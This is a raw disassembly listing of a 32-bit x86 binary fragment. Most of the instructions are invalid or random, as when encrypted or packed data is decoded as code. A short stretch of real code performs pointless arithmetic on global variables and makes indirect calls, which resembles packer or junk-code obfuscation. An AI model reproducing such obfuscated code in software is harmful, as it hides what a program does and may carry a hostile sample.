  41e6cb:	xor    bl,BYTE PTR [esi-0x3a1202c4]
  41e6d1:	push   ss
  41e6d2:	push   ds
  41e6d3:	addr16 xor bl,ah
  41e6d6:	div    ah
  41e6d8:	imul   esi,DWORD PTR [ebp-0x7d],0xffffff91
  41e6dc:	dec    ecx
  41e6dd:	and    DWORD PTR [edx+eax*1],ebx
  41e6e0:	jge    0x41e6b4
  41e6e2:	push   edi
  41e6e3:	aad    0xd3
  41e6e5:	pusha  
  41e6e6:	pop    eax
  41e6e7:	mov    ds:0x3566c7c6,al
  41e6ec:	sbb    DWORD PTR [ecx-0x71],ebx
  41e6ef:	adc    al,0xd4
  41e6f1:	into   
  41e6f2:	mov    bh,0x8f
  41e6f4:	aas    
  41e6f5:	arpl   di,di
  41e6f7:	xchg   ecx,eax
  41e6f8:	repz enter 0xc85,0x54
  41e6fd:	mov    BYTE PTR [ebp-0xb592584],ch
  41e703:	int    0xd1
  41e705:	shl    DWORD PTR [esi+edi*4+0x59],cl
  41e709:	and    cl,cl
  41e70b:	loop   0x41e717
  41e70d:	sub    cl,BYTE PTR [edi]
  41e70f:	fnstenv [ebx+0x3f]
  41e712:	mov    dh,0xc4
  41e714:	nop    DWORD PTR [ebx-0x3a]
  41e718:	mov    ebp,0xa5f4519c
  41e71d:	rcl    BYTE PTR [esi-0x48],cl
  41e720:	loope  0x41e787
  41e722:	inc    ebx
  41e723:	push   ecx
  41e724:	push   0x16
  41e726:	add    BYTE PTR [esi],dh
  41e728:	or     DWORD PTR [edx],ecx
  41e72a:	call   0x672fd8ef
  41e72f:	retf   
  41e730:	(bad)  
  41e731:	(bad)  
  41e732:	pop    ebx
  41e733:	or     al,0x0
  41e735:	push   eax
  41e736:	xchg   edx,eax
  41e737:	mov    eax,ds:0x96869360
  41e73c:	in     eax,dx
  41e73d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e73e:	pop    eax
  41e73f:	pop    edi
  41e740:	add    edx,edi
  41e742:	ret    0x8b07
  41e745:	rsm    
  41e747:	icebp  
  41e748:	cmp    BYTE PTR [eax+0x38],0xdb
  41e74c:	inc    edx
  41e74d:	nop
  41e74e:	mov    dh,0x73
  41e750:	stc    
  41e751:	xchg   ecx,eax
  41e752:	in     al,dx
  41e753:	lahf   
  41e754:	sbb    WORD PTR [edx-0x55930a04],0xecc0
  41e75d:	ss jbe 0x41e7c6
  41e760:	stc    
  41e761:	adc    eax,0xe238602f
  41e766:	sbb    bh,ah
  41e768:	and    BYTE PTR [ebx+0x35c656a2],bh
  41e76e:	jl     0x41e7cb
  41e770:	sub    cl,BYTE PTR [edi]
  41e772:	daa    
  41e773:	cmp    al,0xc3
  41e775:	pop    edx
  41e776:	push   eax
  41e777:	das    
  41e778:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e779:	cmp    BYTE PTR [eax],al
  41e77b:	(bad)  
  41e77c:	aaa    
  41e77d:	mov    ebp,0x70787cd5
  41e782:	aam    0xcd
  41e784:	adc    al,0xe5
  41e786:	cmp    eax,DWORD PTR [edi-0x75]
  41e789:	test   eax,0x98d8835f
  41e78e:	addr16 sbb al,0xda
  41e791:	sbb    DWORD PTR [edi-0x62],0x2f
  41e795:	cdq    
  41e796:	pop    ss
  41e797:	xor    edx,esi
  41e799:	dec    edi
  41e79a:	adc    eax,0x163caa1
  41e79f:	jecxz  0x41e7d0
  41e7a1:	push   esp
  41e7a2:	clc    
  41e7a3:	shl    BYTE PTR [eax-0x57],cl
  41e7a6:	sub    eax,0xfad4ed37
  41e7ab:	jno    0x41e81a
  41e7ad:	shl    BYTE PTR [eax],cl
  41e7af:	aaa    
  41e7b0:	test   eax,0xa9697e2a
  41e7b5:	push   0x87f57290
  41e7ba:	stc    
  41e7bb:	mov    ds:0x67c6a835,eax
  41e7c0:	push   eax
  41e7c1:	in     eax,dx
  41e7c2:	mov    edi,0x505876ae
  41e7c7:	imul   esi,esi,0x77
  41e7ca:	nop
  41e7cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7cc:	mov    bl,0x70
  41e7ce:	bound  ebx,QWORD PTR [eax-0x5d37b7aa]
  41e7d4:	lods   al,BYTE PTR ds:[esi]
  41e7d5:	pop    ebp
  41e7d6:	dec    ecx
  41e7d7:	test   eax,0x418e266f
  41e7dc:	dec    ebp
  41e7dd:	ret    0x81b9
  41e7e0:	mov    ah,0x67
  41e7e2:	inc    DWORD PTR [ecx-0x29]
  41e7e5:	adc    BYTE PTR [edi],bh
  41e7e7:	sub    cl,BYTE PTR [ebx-0x9]
  41e7ea:	pop    ebp
  41e7eb:	mov    BYTE PTR [esi+0x5ef9c43a],bh
  41e7f1:	mov    ch,0x64
  41e7f3:	nop
  41e7f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7f5:	aam    0x62
  41e7f7:	add    DWORD PTR [eax],ebx
  41e7f9:	test   al,0xbf
  41e7fb:	sbb    al,0xc6
  41e7fd:	repnz dec ebx
  41e7ff:	retf   
  41e800:	push   edx
  41e801:	pop    eax
  41e802:	sar    BYTE PTR [edx],0xff
  41e805:	loop   0x41e84a
  41e807:	es out 0x3f,al
  41e80a:	jecxz  0x41e87a
  41e80c:	std    
  41e80d:	sub    eax,0x3e1f9e5c
  41e812:	ja     0x41e83e
  41e814:	pop    ds
  41e815:	add    eax,eax
  41e817:	leave  
  41e818:	ret    
  41e819:	(bad)  [ecx]
  41e81b:	(bad)  
  41e81c:	sub    DWORD PTR [ebx+0x448cee0f],eax
  41e822:	aad    0xd3
  41e824:	or     al,0x32
  41e826:	inc    edx
  41e827:	or     eax,0x5d2d4532
  41e82c:	jmp    0xf01fae56
  41e831:	inc    ecx
  41e832:	out    0xb3,al
  41e834:	fmulp  st(4),st
  41e836:	shr    DWORD PTR [ecx],0x3
  41e839:	mov    DWORD PTR [ebx],esp
  41e83b:	(bad)  [edx-0x3c1941ae]
  41e841:	add    ebp,ebp
  41e843:	or     DWORD PTR [ebx+0x7],0xfffffffa
  41e847:	inc    esp
  41e848:	mov    eax,ds:0xc130d26f
  41e84d:	mov    ds:0x4ed237ef,al
  41e852:	or     ebp,DWORD PTR [ecx-0x49117948]
  41e858:	jb     0x41e8cd
  41e85a:	mov    edx,0xb97b0c64
  41e85f:	mov    edi,0x95d29a01
  41e864:	(bad)  
  41e865:	pop    edi
  41e866:	mov    ah,0xf1
  41e868:	fbld   TBYTE PTR [edx+0x7a2a0671]
  41e86e:	xor    BYTE PTR [eax+0x7ad16362],0x9f
  41e875:	lods   al,BYTE PTR ds:[esi]
  41e876:	das    
  41e877:	scas   al,BYTE PTR es:[edi]
  41e878:	dec    edx
  41e879:	(bad)  
  41e87a:	pop    esp
  41e87b:	js     0x41e8bf
  41e87d:	ins    BYTE PTR es:[edi],dx
  41e87e:	xchg   esp,eax
  41e87f:	mov    esi,0xd78de95c
  41e884:	dec    edi
  41e885:	icebp  
  41e886:	pop    ecx
  41e887:	sbb    eax,DWORD PTR [esi+ecx*8]
  41e88a:	add    al,0x24
  41e88c:	pop    ds
  41e88d:	mov    ebx,0x981c7e90
  41e892:	repz sub al,0x5f
  41e895:	sub    ah,BYTE PTR [esi]
  41e897:	pop    ebx
  41e898:	test   BYTE PTR [ebx+0x0],dh
  41e89b:	neg    BYTE PTR [ebx-0x56]
  41e89e:	mov    ds:0xb8cb4ebb,al
  41e8a3:	push   0xb66add5b
  41e8a8:	or     al,0x49
  41e8aa:	in     eax,dx
  41e8ab:	push   0xfffffff9
  41e8ad:	(bad)  
  41e8ae:	mov    bh,0x60
  41e8b0:	pop    eax
  41e8b1:	lods   eax,DWORD PTR ds:[esi]
  41e8b2:	xchg   esi,eax
  41e8b4:	lahf   
  41e8b5:	dec    ebp
  41e8b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8b7:	repnz push eax
  41e8b9:	je     0x41e926
  41e8bb:	(bad)  [ecx-0x2cb8898d]
  41e8c1:	jne    0x41e8b4
  41e8c3:	adc    BYTE PTR [eax+0x18f922ab],ch
  41e8c9:	or     BYTE PTR [ebp-0x27],dl
  41e8cc:	in     eax,dx
  41e8cd:	pop    esp
  41e8ce:	loop   0x41e8f6
  41e8d0:	outs   dx,DWORD PTR ds:[esi]
  41e8d1:	xchg   edx,eax
  41e8d2:	mov    esp,0xfc330a42
  41e8d7:	in     eax,0xb8
  41e8d9:	and    bh,BYTE PTR [ecx]
  41e8db:	dec    esi
  41e8dc:	scas   al,BYTE PTR es:[edi]
  41e8dd:	mov    edx,0x272c33b0
  41e8e2:	sbb    edi,DWORD PTR [edi+0x1a4ce5e0]
  41e8e8:	mov    al,ds:0x20df307c
  41e8ed:	jl     0x41e917
  41e8ef:	aaa    
  41e8f0:	push   cs
  41e8f1:	lods   al,BYTE PTR ds:[esi]
  41e8f2:	xor    al,0x4f
  41e8f4:	sub    BYTE PTR [ecx-0x43653e18],bh
  41e8fa:	push   edi
  41e8fb:	leave  
  41e8fc:	xor    BYTE PTR [esi],ah
  41e8fe:	xchg   BYTE PTR [eax+0x2f726941],ah
  41e904:	sar    ch,cl
  41e906:	dec    eax
  41e907:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e908:	ret    
  41e909:	std    
  41e90a:	adc    cl,dh
  41e90c:	test   al,0x9a
  41e90e:	imul   edi,ecx,0xc4cdc728
  41e914:	jbe    0x41e912
  41e916:	xor    DWORD PTR [ebp+0x37],esp
  41e919:	leave  
  41e91a:	jae    0x41e985
  41e91c:	mov    eax,ds:0xf0a8ef6a
  41e921:	pop    esi
  41e922:	jne    0x41e90f
  41e924:	pop    ds
  41e925:	dec    ebp
  41e926:	mov    ah,0x69
  41e928:	nop
  41e929:	scas   al,BYTE PTR es:[edi]
  41e92a:	cmp    esi,eax
  41e92c:	sub    esp,ecx
  41e92e:	popa   
  41e92f:	xchg   DWORD PTR [eax],ebx
  41e931:	xchg   BYTE PTR ss:[ebx],dl
  41e934:	and    eax,0xc6d17dc9
  41e939:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41e93b:	jle    0x41e8f2
  41e93d:	sbb    eax,0xdb6b62aa
  41e942:	xchg   esi,eax
  41e943:	sbb    BYTE PTR [ecx-0x26],ch
  41e946:	pusha  
  41e947:	adc    bl,BYTE PTR [esp+esi*8+0x69]
  41e94b:	mov    bh,0x6a
  41e94d:	dec    esi
  41e94e:	cmp    DWORD PTR [edi-0x3c],edi
  41e951:	dec    ebp
  41e952:	mov    edx,ebx
  41e954:	sahf   
  41e955:	dec    edx
  41e956:	push   0xffffffb6
  41e958:	fmul   QWORD PTR [edi+0x23]
  41e95b:	dec    eax
  41e95c:	and    BYTE PTR [edi+eiz*8],al
  41e95f:	(bad)  
  41e960:	retf   
  41e961:	aam    0x82
  41e963:	inc    eax
  41e964:	or     eax,ebp
  41e966:	adc    ebx,DWORD PTR [eax-0x80]
  41e969:	xchg   BYTE PTR [edx+0x75],ah
  41e96c:	add    BYTE PTR [ecx-0x40],0x86
  41e970:	pop    es
  41e971:	sbb    al,0x78
  41e973:	inc    esp
  41e974:	push   edx
  41e975:	sub    edx,DWORD PTR [esi+0x5b8e5a81]
  41e97b:	inc    eax
  41e97c:	leave  
  41e97d:	jge    0x41e9ce
  41e97f:	out    dx,al
  41e980:	fs jmp 0x8bca:0x8bd70b24
  41e988:	push   esp
  41e989:	and    al,0x18
  41e98b:	xor    eax,ebx
  41e98d:	xor    ecx,esi
  41e98f:	mov    esi,DWORD PTR [esp+0x1c]
  41e993:	cmp    edx,eax
  41e995:	jne    0x41e9a3
  41e99b:	cmp    esi,ecx
  41e99d:	je     0x41e9ea
  41e9a3:	push   DWORD PTR ds:0x422638
  41e9a9:	push   DWORD PTR ds:0x4223cc
  41e9af:	mov    eax,ds:0x422548
  41e9b4:	mov    eax,DWORD PTR [eax+0x1a4]
  41e9ba:	push   DWORD PTR [eax]
  41e9bc:	mov    eax,DWORD PTR [esp+0x78]
  41e9c0:	call   eax
  41e9c2:	mov    ecx,DWORD PTR ds:0x422548
  41e9c8:	mov    ecx,DWORD PTR [ecx+0x1dc]
  41e9ce:	mov    DWORD PTR [ecx],eax
  41e9d0:	mov    eax,ds:0x422548
  41e9d5:	push   0x4
  41e9d7:	add    eax,0x1dc
  41e9dc:	push   eax
  41e9dd:	lea    eax,[esp+0x84]
  41e9e4:	push   eax
  41e9e5:	call   0x415231
  41e9ea:	mov    eax,DWORD PTR [esp+0x7c]
  41e9ee:	mov    eax,DWORD PTR [eax]
  41e9f0:	pop    edi
  41e9f1:	pop    esi
  41e9f2:	pop    ebx
  41e9f3:	mov    esp,ebp
  41e9f5:	pop    ebp
  41e9f6:	ret    0xc
  41e9f9:	push   ebp
  41e9fa:	mov    ebp,esp
  41e9fc:	sub    esp,0x23c
  41ea02:	or     ecx,eax
  41ea04:	push   ebx
  41ea05:	cmp    DWORD PTR ds:0x428257,0x0
  41ea0c:	mov    DWORD PTR ds:0x428363,0x7749
  41ea16:	mov    DWORD PTR ds:0x428163,ebx
  41ea1c:	mov    DWORD PTR ds:0x428303,edx
  41ea22:	mov    DWORD PTR ds:0x428303,0xc7b
  41ea2c:	jmp    0x41ea8e
  41ea31:	mov    DWORD PTR ds:0x42827b,edx
  41ea37:	cmp    DWORD PTR ds:0x428257,0x0
  41ea3e:	jg     0x41ea74
  41ea44:	push   0x2154
  41ea49:	push   0x5063
  41ea4e:	call   DWORD PTR ds:0x428e04
  41ea54:	sbb    DWORD PTR ds:0x42835f,ecx
  41ea5a:	mov    ecx,DWORD PTR ds:0x42830b
  41ea60:	xor    ecx,DWORD PTR ds:0x4282f7
  41ea66:	mov    DWORD PTR ds:0x42830b,ecx
  41ea6c:	sbb    ecx,0x6e15
  41ea72:	neg    ecx
  41ea74:	xor    DWORD PTR ds:0x428233,ecx
  41ea7a:	adc    ecx,DWORD PTR ds:0x428187
  41ea80:	mov    ecx,DWORD PTR ds:0x4281d3
  41ea86:	mov    ecx,DWORD PTR [ecx]
  41ea88:	and    DWORD PTR ds:0x428177,ecx
  41ea8e:	push   esi
  41ea8f:	mov    ecx,DWORD PTR ds:0x4281e7
  41ea95:	mov    eax,ds:0x4282d3
  41ea9a:	sub    eax,ecx
  41ea9c:	imul   ecx,DWORD PTR [ecx+eax*1]
  41eaa0:	push   edi
  41eaa1:	add    DWORD PTR ds:0x42824b,ebx
  41eaa7:	mov    DWORD PTR [ebp-0x50],0x1
  41eaae:	sub    DWORD PTR ds:0x42827b,edi
  41eab4:	mov    DWORD PTR [ebp-0xbc],0x61a1
  41eabe:	xor    DWORD PTR ds:0x42830b,0x437e
  41eac8:	mov    DWORD PTR [ebp-0xb8],0x1
  41ead2:	mov    ecx,DWORD PTR [ebp-0xb8]
  41ead8:	add    eax,0x2e28
  41eadd:	mov    eax,0x584
  41eae2:	xor    edx,edx
  41eae4:	sbb    DWORD PTR ds:0x428387,0x4282df
  41eaee:	div    ecx
  41eaf0:	xor    ecx,0x2352
  41eaf6:	imul   eax,eax,0x51d4
  41eafc:	neg    ecx
  41eafe:	mov    ecx,DWORD PTR [ebp-0xbc]
  41eb04:	or     DWORD PTR ds:0x428373,0x428383
  41eb0e:	xor    eax,ecx
  41eb10:	and    eax,0x4c09
  41eb15:	xor    ecx,DWORD PTR ds:0x4282f3
  41eb1b:	mov    ecx,DWORD PTR [ebp-0x50]
  41eb1e:	xor    edx,edx
  41eb20:	and    DWORD PTR ds:0x42824b,0x42817f
  41eb2a:	div    ecx
  41eb2c:	or     DWORD PTR ds:0x428397,0x3423
  41eb36:	sub    eax,0x401
  41eb3b:	cmp    DWORD PTR ds:0x428317,0x0
  41eb42:	mov    DWORD PTR ds:0x428387,edx
  41eb48:	mov    DWORD PTR ds:0x428227,ebx
  41eb4e:	not    DWORD PTR ds:0x428223
  41eb54:	jmp    0x41ebb2
  41eb59:	mov    DWORD PTR ds:0x42821b,0x3ca0
  41eb63:	not    DWORD PTR ds:0x428307
  41eb69:	cmp    DWORD PTR ds:0x428317,0x0
  41eb70:	je     0x41eba0
  41eb76:	push   DWORD PTR [ebp-0x10]
  41eb79:	push   0x4da1
  41eb7e:	push   0x1144
  41eb83:	push   DWORD PTR [ebp-0x18]
  41eb86:	call   DWORD PTR ds:0x428e08
  41eb8c:	add    edx,0x1800
  41eb92:	add    edx,DWORD PTR ds:0x42837f
  41eb98:	sub    ecx,ecx
  41eb9a:	adc    ecx,0x47f1
  41eba0:	sub    edx,edx
  41eba2:	mov    DWORD PTR ds:0x428387,0x44a4
  41ebac:	and    ecx,DWORD PTR ds:0x42821f
  41ebb2:	mov    DWORD PTR [ebp-0x90],eax
  41ebb8:	mov    eax,ds:0x4282b3
  41ebbd:	mov    eax,DWORD PTR [eax]
  41ebbf:	sbb    DWORD PTR ds:0x428383,eax
  41ebc5:	mov    DWORD PTR [ebp-0x8c],0x2ff8
  41ebcf:	add    DWORD PTR ds:0x42814b,0x428297
  41ebd9:	mov    DWORD PTR [ebp-0x4c],0x39f7
  41ebe0:	xor    DWORD PTR ds:0x42823f,edx
  41ebe6:	mov    DWORD PTR [ebp-0xb4],0x3842
  41ebf0:	or     edx,ecx
  41ebf2:	jmp    0x41ef4e
  41ebf7:	ret    0x8bf6
  41ebfa:	push   ebx
  41ebfb:	sbb    ch,BYTE PTR [ebx]
  41ebfd:	mov    edx,0x71125f66
  41ec02:	mov    al,0x78
  41ec04:	push   ecx
  41ec05:	iret   
  41ec06:	jo     0x41ec16
  41ec08:	das    
  41ec09:	push   ss
  41ec0a:	sbb    BYTE PTR [ebx+0x3e181812],ah
  41ec10:	(bad)  
  41ec11:	repz xor bl,ch
  41ec14:	es (bad) 
  41ec16:	(bad)  
  41ec17:	in     al,dx
  41ec18:	inc    esp
  41ec19:	repnz sbb al,0xb6
  41ec1c:	cmp    bl,BYTE PTR [ebx]
  41ec1e:	pusha  
  41ec1f:	push   0xb6e10231
  41ec24:	pop    esi
  41ec25:	cmp    ah,BYTE PTR [ebx+0x71]
  41ec28:	mov    esi,esp
  41ec2a:	and    eax,0x5cf6899f
  41ec2f:	in     eax,0x93
  41ec31:	xor    al,0x66
  41ec33:	js     0x41ec4d
  41ec35:	rcr    DWORD PTR [esi],0x76
  41ec38:	cs push esp
  41ec3a:	pop    ebp
  41ec3b:	(bad)  
  41ec3c:	jg     0x41ecb9
  41ec3e:	xor    bl,0x74
  41ec41:	jnp    0x41ec54
  41ec43:	pop    ss
  41ec44:	dec    esp
  41ec45:	sbb    WORD PTR [ecx-0x7c462d41],bp
  41ec4c:	pop    ebp
  41ec4d:	call   FWORD PTR [esi]
  41ec4f:	je     0x41ebf3
  41ec51:	scas   al,BYTE PTR es:[edi]
  41ec52:	out    0xc2,eax
  41ec54:	in     al,dx
  41ec55:	add    ebx,edx
  41ec57:	pop    esp
  41ec58:	mov    ds:0xea810879,al
  41ec5d:	inc    esp
  41ec5e:	icebp  
  41ec5f:	add    ebx,DWORD PTR [esi+ebx*4-0xdeb545b]
  41ec66:	sub    al,0xb4
  41ec68:	mov    dl,0xa1
  41ec6a:	fs (bad) 
  41ec6c:	rcr    BYTE PTR [edi-0x2254dfd6],cl
  41ec72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec73:	sar    DWORD PTR [ebp+0x362fabc6],cl
  41ec79:	clc    
  41ec7a:	rcr    BYTE PTR [eax+0x10afdba],1
  41ec80:	jnp    0x41ec54
  41ec82:	test   eax,0xfb6df80b
  41ec87:	js     0x41eccf
  41ec89:	pop    eax
  41ec8a:	mov    cl,0x78
  41ec8c:	sub    DWORD PTR [edx-0x4b],ebx
  41ec8f:	daa    
  41ec90:	inc    edi
  41ec92:	push   edx
  41ec93:	lea    edi,[edi+0x299f6186]
  41ec99:	sub    BYTE PTR [edx+0x27],al
  41ec9c:	lea    edx,[edi]
  41ec9e:	add    dh,dh
  41eca0:	push   esi
  41eca1:	pusha  
  41eca2:	push   esi
  41eca3:	out    0xa9,al
  41eca5:	test   eax,0x87a8f253
  41ecaa:	sbb    eax,0xbabd99f4
  41ecaf:	mov    bh,0x11
  41ecb1:	inc    edx
  41ecb2:	std    
  41ecb3:	test   eax,0x608af1db
  41ecb8:	and    dh,BYTE PTR [esi+ebx*2+0x33]
  41ecbc:	je     0x41ec56
  41ecbe:	hlt    
  41ecbf:	sbb    eax,esi
  41ecc1:	jp     0x41ec45
  41ecc3:	fst    DWORD PTR [edx+0x1]
  41ecc6:	(bad)  
  41ecc7:	adc    ah,bh
  41ecc9:	or     eax,0xe0de3914
  41ecce:	cli    
  41eccf:	lea    ecx,[ecx]
  41ecd1:	ret    
  41ecd2:	ret    0x64b3
  41ecd5:	push   ecx
  41ecd6:	test   BYTE PTR [esp+edi*2+0x61],bh
  41ecda:	sbb    eax,DWORD PTR [ebp+0x1b]
  41ecdd:	mov    ch,0xdf
  41ecdf:	ins    DWORD PTR es:[edi],dx
  41ece0:	in     eax,0x10
  41ece2:	inc    esp
  41ece3:	sub    al,0x7d
  41ece5:	daa    
  41ece6:	sbb    eax,0x36ffe058
  41eceb:	call   0x1c2b:0xdae04e9e
  41ecf2:	dec    ebx
  41ecf3:	retf   0x48e4
  41ecf6:	jo     0x41ed0f
  41ecf8:	fs fucom st(1)
  41ecfb:	jnp    0x41ed29
  41ecfd:	jl     0x41ed26
  41ecff:	mov    ah,0xa9
  41ed01:	inc    esi
  41ed02:	pusha  
  41ed03:	jmp    0xbb12acb1
  41ed08:	fisttp WORD PTR [esi+0x45828f81]
  41ed0e:	push   0x7c
  41ed10:	repnz dec esi
  41ed12:	dec    ebx
  41ed13:	retf   
  41ed14:	call   0xa4a9:0x1b91e491
  41ed1b:	xchg   ebp,eax
  41ed1c:	mov    al,0x3
  41ed1e:	pusha  
  41ed1f:	stos   BYTE PTR es:[edi],al
  41ed20:	push   0xffffffe8
  41ed22:	loop   0x41ed5a
  41ed24:	ret    0xe272
  41ed27:	sub    DWORD PTR [esi+0x111eaec3],ecx
  41ed2d:	sahf   
  41ed2e:	pop    esp
  41ed2f:	add    DWORD PTR [edi+0x7533f03c],0x300a6e9f
  41ed39:	loop   0x41ed26
  41ed3b:	push   esi
  41ed3c:	pop    esp
  41ed3d:	xor    dl,cl
  41ed3f:	fbstp  TBYTE PTR [edi-0x5c]
  41ed42:	div    BYTE PTR [ebp+0x57]
  41ed45:	xchg   ebp,eax
  41ed46:	aad    0xa1
  41ed48:	repz sbb al,0xdd
  41ed4b:	mov    edi,0x34fff1df
  41ed50:	push   eax
  41ed51:	rcr    BYTE PTR [ecx],0xb8
  41ed54:	mov    ebp,fs
  41ed56:	lahf   
  41ed57:	scas   eax,DWORD PTR es:[edi]
  41ed58:	mov    bh,0xb
  41ed5a:	push   0x64
  41ed5c:	dec    ecx
  41ed5d:	pop    ecx
  41ed5e:	fdiv   st,st(3)
  41ed60:	add    edi,ebx
  41ed62:	(bad)  
  41ed63:	in     eax,0xde
  41ed65:	cmp    ebx,DWORD PTR [ebp-0x38]
  41ed68:	mov    dl,0x38
  41ed6a:	std    
  41ed6b:	xor    BYTE PTR [ecx+0x43],dl
  41ed6e:	in     al,0x14
  41ed70:	adc    ecx,0x96fe9043
  41ed76:	sub    ebx,DWORD PTR [edi]
  41ed78:	push   ecx
  41ed79:	jp     0x41ed8a
  41ed7b:	adc    ecx,edi
  41ed7d:	dec    ebx
  41ed7e:	aaa    
  41ed7f:	mov    ah,BYTE PTR [eax-0x297683b]
  41ed85:	jb     0x41edc4
  41ed87:	mov    WORD PTR [esi],ds
  41ed89:	dec    ecx
  41ed8a:	dec    ebp
  41ed8b:	pop    es
  41ed8c:	push   ss
  41ed8d:	int    0xb0
  41ed8f:	test   al,0x4c
  41ed91:	jp     0x41edd1
  41ed93:	jge    0x41ed65
  41ed95:	xor    DWORD PTR [eax+ebp*2],eax
  41ed98:	lods   eax,DWORD PTR ds:[esi]
  41ed99:	js     0x41ed3d
  41ed9b:	loopne 0x41ed30
  41ed9d:	fimul  DWORD PTR [ebx-0x6a]
  41eda0:	pusha  
  41eda1:	mov    edx,0xe2b9b5fd
  41eda6:	adc    al,0xa9
  41eda8:	les    edi,FWORD PTR [edi]
  41edaa:	fisub  WORD PTR [edx-0x68]
  41edad:	cmp    bh,BYTE PTR [esi+0x25]
  41edb0:	bndldx bnd0,[edi]
  41edb3:	and    al,0x18
  41edb5:	ja     0x41edf1
  41edb7:	push   ss
  41edb8:	push   0x74df305
  41edbd:	or     bl,BYTE PTR [esi-0x537ab9e6]
  41edc3:	lea    eax,[esi]
  41edc5:	pushf  
  41edc6:	ss push eax
  41edc8:	push   esp
  41edc9:	xchg   edx,eax
  41edca:	jmp    0x41ee0e
  41edcc:	fcmove st,st(4)
  41edce:	pop    ss
  41edcf:	fisttp DWORD PTR [ebx+edx*8-0x48]
  41edd3:	cmc    
  41edd4:	fucom  st(2)
  41edd6:	mov    eax,ds:0x877f642d
  41eddb:	dec    esp
  41eddc:	stc    
  41eddd:	int    0x3f
  41eddf:	loopne 0x41edb8
  41ede1:	enter  0xd4f4,0x77
  41ede5:	arpl   WORD PTR [edx+0x50f0bff2],sp
  41edeb:	jmp    0x67eecd52
  41edf0:	and    al,0x0
  41edf2:	pusha  
  41edf3:	into   
  41edf4:	sti    
  41edf5:	ror    BYTE PTR ds:0x68f013e1,1
  41edfb:	js     0x41edce
  41edfd:	sbb    DWORD PTR [edx],0xffffffe0
  41ee00:	pop    edx
  41ee01:	push   ecx
  41ee02:	add    DWORD PTR [ebx+0x2ef30c6b],0x58e4c153
  41ee0c:	les    eax,FWORD PTR [ecx+ebx*8+0x1ee90fa5]
  41ee13:	outs   dx,DWORD PTR ds:[esi]
  41ee14:	fnstsw WORD PTR [ebx+0x387ece64]
  41ee1a:	fs in  al,0x3c
  41ee1d:	or     DWORD PTR [ecx+0x1a],ebp
  41ee20:	push   edi
  41ee21:	retf   0x736d
  41ee24:	loope  0x41ee90
  41ee26:	or     DWORD PTR [edi+eax*2],ebp
  41ee29:	xchg   ebx,eax
  41ee2a:	mov    edx,0x340c27f0
  41ee2f:	mov    dh,BYTE PTR [ecx+eiz*8-0x44]
  41ee33:	push   edx
  41ee34:	push   edx
  41ee35:	ret    
  41ee36:	and    bl,cl
  41ee38:	mov    ebp,0x25713d81
  41ee3d:	adc    dl,BYTE PTR [ebx+0x33]
  41ee40:	fwait
  41ee41:	hlt    
  41ee42:	jg     0x41ee31
  41ee44:	and    al,BYTE PTR [eax]
  41ee46:	mov    ds:0xba013d9a,eax
  41ee4b:	mov    ebx,0x13fbb05d
  41ee50:	retf   0x5eb7
  41ee53:	sub    DWORD PTR [ecx+0x54595892],esp
  41ee59:	dec    ecx
  41ee5a:	test   edi,ebp
  41ee5c:	adc    al,0x30
  41ee5e:	jo     0x41ee65
  41ee60:	jmp    0xabc7:0xe3d37260
  41ee67:	call   0xaba8:0x867a79a7
  41ee6e:	cld    
  41ee6f:	scas   eax,DWORD PTR es:[edi]
  41ee70:	out    dx,al
  41ee71:	jo     0x41ee2e
  41ee73:	data16 cli 
  41ee75:	dec    ecx
  41ee76:	rol    dl,1
  41ee78:	sbb    eax,0x492abeae
  41ee7d:	dec    esi
  41ee7e:	xchg   BYTE PTR [eax],al
  41ee80:	cmp    bh,bh
  41ee82:	test   DWORD PTR [edx],ebp
  41ee84:	jle    0x41ee2a
  41ee86:	mov    DWORD PTR [ecx],esi
  41ee88:	lock push ebx
  41ee8a:	outs   dx,BYTE PTR ds:[esi]
  41ee8b:	fwait
  41ee8c:	pop    edx
  41ee8d:	call   0xaa2d3581
  41ee92:	jge    0x41ee50
  41ee94:	jb     0x41ee4e
  41ee96:	(bad)  
  41ee97:	jp     0x41ee1e
  41ee99:	add    dh,BYTE PTR [edi-0x28]
  41ee9c:	xchg   di,ax
  41ee9e:	out    dx,al
  41ee9f:	mov    ds:0xf79ea16a,eax
  41eea4:	jb     0x41eefd
  41eea6:	jbe    0x41ef1f
  41eea8:	adc    dh,BYTE PTR [edx+0x11]
  41eeab:	dec    ecx
  41eeac:	mov    ecx,0xc63e0671
  41eeb1:	fwait
  41eeb2:	out    dx,al
  41eeb3:	jnp    0x41ee3c
  41eeb5:	mov    ch,0xa9
  41eeb7:	mov    gs,WORD PTR [esi-0x2a]
  41eeba:	jg     0x41ee82
  41eebc:	out    0x27,eax
  41eebe:	pop    ds
  41eebf:	popf   
  41eec0:	push   ebp
  41eec1:	jb     0x41ee6a
  41eec3:	inc    ebx
  41eec4:	fiadd  DWORD PTR [eax]
  41eec6:	fwait
  41eec7:	les    ebx,FWORD PTR [edi-0x38d807bd]
  41eecd:	pop    edx
  41eece:	mov    BYTE PTR [ebx-0x38aa73ae],al
  41eed4:	fsub   QWORD PTR [edi+0x12]
  41eed7:	jns    0x41eee8
  41eed9:	es icebp 
  41eedb:	sar    ecx,1
  41eedd:	adc    BYTE PTR [ecx-0x586ef431],dh
  41eee3:	sbb    al,0xe9
  41eee5:	ret    
  41eee6:	push   ebp
  41eee7:	mov    cl,0x8f
  41eee9:	sbb    ebx,DWORD PTR [ecx]
  41eeeb:	adc    BYTE PTR [ebx-0x4e],0x32
  41eeef:	inc    edi
  41eef0:	pop    ecx
  41eef1:	sbb    esi,DWORD PTR [ebp+0x35]
  41eef4:	call   DWORD PTR [esi+0x32bc7ee3]
  41eefa:	push   cs
  41eefb:	inc    ebp
  41eefc:	aam    0xd7
  41eefe:	adc    dh,BYTE PTR [ebx-0x1fa9bee8]
  41ef04:	retf   
  41ef05:	dec    ecx
  41ef06:	mov    ch,0xc7
  41ef08:	sbb    edx,DWORD PTR ds:0xfece3ab7
  41ef0e:	daa    
  41ef0f:	cld    
  41ef10:	push   0xffffffbf
  41ef12:	add    eax,0xbbf1a0f4
  41ef17:	push   ebp
